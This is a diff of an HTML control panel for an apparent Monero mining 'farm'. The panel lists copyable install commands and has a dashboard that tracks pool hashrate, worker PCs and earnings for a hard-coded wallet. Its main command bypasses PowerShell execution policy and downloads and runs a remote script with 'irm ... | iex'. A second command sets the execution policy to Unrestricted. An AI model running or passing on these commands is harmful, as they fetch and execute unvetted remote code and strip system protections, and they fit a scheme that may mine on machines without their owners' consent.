@@ -3,203 +3,205 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>XMR Farm Panel</title>
+    <title>XMR Farm: Pro Dashboard</title>
     <style>
         :root {
-            --bg-color: #0f172a;
-            --glass-bg: rgba(255, 255, 255, 0.05);
+            --bg-color: #0b0f1a;
+            --glass-bg: rgba(255, 255, 255, 0.03);
             --glass-border: rgba(255, 255, 255, 0.1);
             --accent-color: #38bdf8;
+            --money-color: #4ade80;
+            --uzs-color: #fbbf24;
             --text-color: #f1f5f9;
         }
 
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            cursor: none; /* Скрываем дефолтную мышь для эффекта стекла */
+        * { margin: 0; padding: 0; box-sizing: border-box; cursor: none; }
+        body { background-color: var(--bg-color); color: var(--text-color); font-family: 'Segoe UI', sans-serif; min-height: 100vh; }
+
+        /* Навигация */
+        .nav-tabs {
+            display: flex; justify-content: center; gap: 15px; padding: 25px 0;
+            position: sticky; top: 0; background: rgba(11, 15, 26, 0.9); backdrop-filter: blur(15px); z-index: 100;
         }
 
-        body {
-            background-color: var(--bg-color);
-            color: var(--text-color);
-            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            overflow-x: hidden;
+        .tab-btn {
+            background: var(--glass-bg); border: 1px solid var(--glass-border); color: var(--text-color);
+            padding: 10px 25px; border-radius: 20px; font-weight: 600; transition: 0.3s;
         }
 
-        .container {
-            max-width: 800px;
-            width: 90%;
-            padding: 40px;
-            z-index: 1;
+        .tab-btn.active { background: var(--accent-color); color: #000; box-shadow: 0 0 15px var(--accent-color); }
+
+        .container { max-width: 1000px; margin: 0 auto; width: 95%; }
+        .section { display: none; animation: fadeIn 0.4s ease-out; }
+        .section.active { display: block; }
+
+        @keyframes fadeIn { from { opacity: 0; transform: scale(0.98); } to { opacity: 1; transform: scale(1); } }
+
+        /* Сетка Dashboard */
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-bottom: 25px; }
+        
+        .stat-card { 
+            background: var(--glass-bg); backdrop-filter: blur(10px); 
+            border: 1px solid var(--glass-border); padding: 20px; border-radius: 16px; 
+            text-align: center; transition: 0.3s;
+        }
+        .stat-card:hover { border-color: var(--accent-color); background: rgba(255,255,255,0.05); }
+        .stat-card span { display: block; font-size: 0.7rem; opacity: 0.5; text-transform: uppercase; margin-bottom: 8px; }
+        .stat-card b { font-size: 1.3rem; display: block; }
+
+        /* Кастомные цвета для денег */
+        #balance_usd { color: var(--money-color); font-size: 1.1rem; }
+        #balance_uzs { color: var(--uzs-color); font-size: 0.9rem; margin-top: 5px; }
+
+        .command-card { 
+            background: var(--glass-bg); border: 1px solid var(--glass-border); 
+            border-radius: 12px; padding: 20px; margin-bottom: 15px; 
+        }
+        
+        code { 
+            display: block; background: rgba(0, 0, 0, 0.6); padding: 15px; 
+            border-radius: 8px; font-family: 'Consolas', monospace; font-size: 0.85rem;
+            border: 1px solid transparent; transition: 0.2s; margin-top: 10px;
+        }
+        .copy-success { border-color: var(--money-color) !important; color: var(--money-color) !important; }
+
+        .log-container { 
+            background: #000; border-radius: 8px; min-height: 200px; 
+            padding: 15px; font-family: 'Consolas', monospace; font-size: 0.8rem; 
+            color: #4ade80; border: 1px solid #222; line-height: 1.6;
         }
 
-        h1 {
-            text-align: center;
-            margin-bottom: 40px;
-            font-size: 2.5rem;
-            letter-spacing: -1px;
-            background: linear-gradient(90deg, #fff, var(--accent-color));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+        /* Жидкое стекло */
+        .glass-cursor { 
+            position: fixed; width: 35px; height: 35px; background: rgba(255,255,255,0.1); 
+            border-radius: 50%; pointer-events: none; z-index: 9999; 
+            backdrop-filter: blur(5px); transform: translate(-50%, -50%); 
+            transition: transform 0.1s ease-out; border: 1px solid rgba(255,255,255,0.2);
         }
 
-        /* Карточки с эффектом стекла */
-        .command-card {
-            background: var(--glass-bg);
-            backdrop-filter: blur(10px);
-            border: 1px solid var(--glass-border);
-            border-radius: 16px;
-            padding: 24px;
-            margin-bottom: 20px;
-            transition: transform 0.3s ease, border-color 0.3s ease;
-        }
+        .footer { text-align: center; padding: 40px 0; opacity: 0.2; font-size: 0.7rem; }
 
-        .command-card:hover {
-            border-color: var(--accent-color);
-            transform: translateY(-5px);
-        }
-
-        h3 {
-            color: var(--accent-color);
-            margin-bottom: 12px;
-            font-size: 1.1rem;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-
-        code {
-            display: block;
-            background: rgba(0, 0, 0, 0.3);
-            padding: 15px;
-            border-radius: 8px;
-            font-family: 'Consolas', monospace;
-            font-size: 0.9rem;
-            word-break: break-all;
-            margin-bottom: 10px;
-            border: 1px dashed rgba(255, 255, 255, 0.2);
-            transition: all 0.2s ease;
-        }
-
-        code:hover {
-            background: rgba(0, 0, 0, 0.5);
-        }
-
-        /* Анимация при копировании */
-        .copy-success {
-            border-color: #4ade80 !important;
-            color: #4ade80 !important;
-            box-shadow: 0 0 15px rgba(74, 222, 128, 0.2);
-        }
-
-        .hint {
-            font-size: 0.85rem;
-            opacity: 0.6;
-            font-style: italic;
-        }
-
-        .footer {
-            text-align: center;
-            margin-top: 40px;
-            font-size: 0.8rem;
-            opacity: 0.4;
-        }
-
-        /* КУРСОР ЖИДКОЕ СТЕКЛО */
-        .glass-cursor {
-            position: fixed;
-            width: 40px;
-            height: 40px;
-            background: rgba(255, 255, 255, 0.1);
-            border: 1px solid rgba(255, 255, 255, 0.3);
-            border-radius: 50%;
-            pointer-events: none;
-            z-index: 9999;
-            backdrop-filter: blur(6px);
-            box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
-            transform: translate(-50%, -50%);
-            transition: transform 0.1s ease-out, opacity 0.3s ease;
-            mix-blend-mode: lighten;
-        }
-
-        .glass-cursor.click {
-            transform: translate(-50%, -50%) scale(0.8);
-            background: rgba(255, 255, 255, 0.2);
-        }
-
-        @media (max-width: 600px) {
-            * { cursor: auto; }
-            .glass-cursor { display: none; }
-        }
+        @media (max-width: 600px) { .glass-cursor { display: none; } * { cursor: auto; } }
     </style>
 </head>
 <body>
 
-    <div class="glass-cursor"></div>
+<div class="glass-cursor"></div>
 
-    <div class="container">
-        <h1>🚀 Ферма XMR: Панель Управления</h1>
-        
-        <div class="command-card">
-            <h3>1. Основная команда (Установка/Обновление)</h3>
-            <code id="cmd1">powershell -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; irm 'https://raw.githubusercontent.com/Isfandiyor0112-star/sminers/main/win_utility.ps1' | iex"</code>
-            <p class="hint">Нажмите на код для копирования. Запускает полную установку.</p>
-        </div>
+<nav class="nav-tabs">
+    <button class="tab-btn active" onclick="openTab('install')">🛠 Установка</button>
+    <button class="tab-btn" onclick="openTab('dashboard')">📊 Dashboard</button>
+</nav>
 
+<div class="container">
+    
+    <section id="install" class="section active">
         <div class="command-card">
-            <h3>2. Снятие ограничений PowerShell</h3>
-            <code id="cmd2"> Set-ExecutionPolicy RemoteSigned -Force </code>
-            <p class="hint">Разрешает запуск любых скриптов в системе.</p>
+            <h3 style="color: var(--accent-color)">1. Установка / Обновление</h3>
+            <code onclick="copyCode(this)">powershell -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; irm 'https://raw.githubusercontent.com/Isfandiyor0112-star/sminers/main/win_utility.ps1' | iex"</code>
         </div>
 
         <div class="command-card">
-            <h3>3. Проверка статуса майнера</h3>
-            <code id="cmd3">check</code>
-            <p class="hint">Отображает текущий хешрейт и температуру CPU.</p>
+            <h3 style="color: var(--accent-color)">2. Разблокировка PowerShell</h3>
+            <code onclick="copyCode(this)">Set-ExecutionPolicy Unrestricted -Force</code>
         </div>
 
-        <div class="footer">
-            Создано Исфандиёром. Версия V12.1.
+        <div class="command-card">
+            <h3 style="color: var(--accent-color)">3. Проверка системы</h3>
+            <code onclick="copyCode(this)">check</code>
         </div>
+    </section>
+
+    <section id="dashboard" class="section">
+        <div class="grid">
+            <div class="stat-card"><span>Мощность</span><b id="hashrate">0.00 KH/s</b></div>
+            <div class="stat-card"><span>Воркеры</span><b id="workers">0</b></div>
+            <div class="stat-card"><span>Баланс XMR</span><b id="balance_xmr">0.00000</b></div>
+            <div class="stat-card">
+                <span>Прибыль (Ожидание)</span>
+                <b id="balance_usd">$0.00</b>
+                <b id="balance_uzs">0 UZS</b>
+            </div>
+        </div>
+
+        <div class="command-card">
+            <h3 style="color: var(--accent-color); margin-bottom: 15px;">Список активных ПК</h3>
+            <div class="log-container" id="logBox">Ожидание данных...</div>
+        </div>
+    </section>
+
+    <div class="footer">
+        Wallet: 429bPn... | Uzbekistan Farm Control | v12.4
     </div>
+</div>
 
-    <script>
-        // 1. Логика копирования
-        document.addEventListener('DOMContentLoaded', () => {
-            const codeBlocks = document.querySelectorAll('code');
-            codeBlocks.forEach(codeBlock => {
-                codeBlock.addEventListener('click', async () => {
-                    try {
-                        await navigator.clipboard.writeText(codeBlock.innerText);
-                        codeBlock.classList.add('copy-success');
-                        setTimeout(() => {
-                            codeBlock.classList.remove('copy-success');
-                        }, 700);
-                    } catch (err) {
-                        alert('Ошибка копирования. Используйте Ctrl+C');
-                    }
-                });
+<script>
+    const WALLET = '429bPnUKuYBQQVHoap1jKTWwiPfGuKAqL7ggbTFFZdbA3LyKScc6EnP9fTVeig7jNqaF7CFhUk5eCU8S5d85gWqU6Zt6bhA';
+
+    function openTab(tabId) {
+        document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+        document.getElementById(tabId).classList.add('active');
+        event.currentTarget.classList.add('active');
+        if(tabId === 'dashboard') fetchAllData();
+    }
+
+    function copyCode(el) {
+        navigator.clipboard.writeText(el.innerText);
+        el.classList.add('copy-success');
+        setTimeout(() => el.classList.remove('copy-success'), 600);
+    }
+
+    async function fetchAllData() {
+        const logBox = document.getElementById('logBox');
+        try {
+            // 1. Данные майнинга
+            const resStats = await fetch(`https://api.moneroocean.stream/miner/${WALLET}/stats`);
+            const stats = await resStats.json();
+            
+            const resWork = await fetch(`https://api.moneroocean.stream/miner/${WALLET}/identifiers`);
+            const workers = await resWork.json();
+
+            // 2. Курс валют (XMR -> USD)
+            const resPrice = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=monero&vs_currencies=usd');
+            const priceData = await resPrice.json();
+            const xmrToUsd = priceData.monero.usd;
+
+            // 3. Курс USD -> UZS (Приблизительный или статический для скорости, тут 12900)
+            const usdToUzs = 12950; 
+
+            const xmrBalance = stats.amtDue / 1000000000000;
+            const usdBalance = xmrBalance * xmrToUsd;
+            const uzsBalance = usdBalance * usdToUzs;
+
+            // Обновление UI
+            document.getElementById('hashrate').innerText = (stats.hash2 / 1000).toFixed(2) + ' KH/s';
+            document.getElementById('workers').innerText = workers.length;
+            document.getElementById('balance_xmr').innerText = xmrBalance.toFixed(6);
+            document.getElementById('balance_usd').innerText = '$' + usdBalance.toFixed(2);
+            document.getElementById('balance_uzs').innerText = Math.round(uzsBalance).toLocaleString() + ' UZS';
+
+            logBox.innerHTML = workers.length ? '' : 'Нет активных воркеров';
+            workers.forEach(w => {
+                logBox.innerHTML += `<div style="margin-bottom:8px">> ПК: <span style="color:#fff">${w.identifier}</span> — <span style="color:var(--accent-color)">${Math.round(w.hash2)} H/s</span></div>`;
             });
-        });
 
-        // 2. Движение стеклянного курсора
-        const cursor = document.querySelector('.glass-cursor');
-        
-        document.addEventListener('mousemove', (e) => {
-            cursor.style.left = e.clientX + 'px';
-            cursor.style.top = e.clientY + 'px';
-        });
+        } catch (e) {
+            logBox.innerHTML = '<span style="color:red">Ошибка загрузки данных. Проверьте соединение.</span>';
+        }
+    }
 
-        document.addEventListener('mousedown', () => cursor.classList.add('click'));
-        document.addEventListener('mouseup', () => cursor.classList.remove('click'));
+    // Курсор
+    const cursor = document.querySelector('.glass-cursor');
+    document.addEventListener('mousemove', e => {
+        cursor.style.left = e.clientX + 'px';
+        cursor.style.top = e.clientY + 'px';
+    });
 
-        // Скрытие курсора при выходе из окна
-        document.addEventListener('mouseleave', () => cursor.style.opacity = '0');
-        document.addEventListener('mouseenter', () => cursor.style.opacity = '1');
-    </script>
+    // Первоначальная загрузка
+    if(document.getElementById('dashboard').classList.contains('active')) fetchAllData();
+    setInterval(fetchAllData, 60000);
+</script>
+
 </body>
 </html>
